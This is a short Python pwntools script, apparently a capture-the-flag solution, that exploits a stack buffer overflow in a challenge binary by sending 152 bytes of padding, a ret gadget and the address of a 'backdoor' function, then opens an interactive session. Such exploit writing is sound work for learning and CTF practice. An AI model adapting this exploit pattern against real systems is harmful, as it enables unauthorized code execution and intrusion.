#!/usr/bin/python3
from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

exe = './binary'

elf = context.binary = ELF(exe, checksec=False)

# Start program
io = start()

padding = 152*b"A"
win = p64(elf.sym.backdoor)
ret = p64(0x000000000040101a)

payload = padding + ret + win

io.sendline(payload)


io.interactive()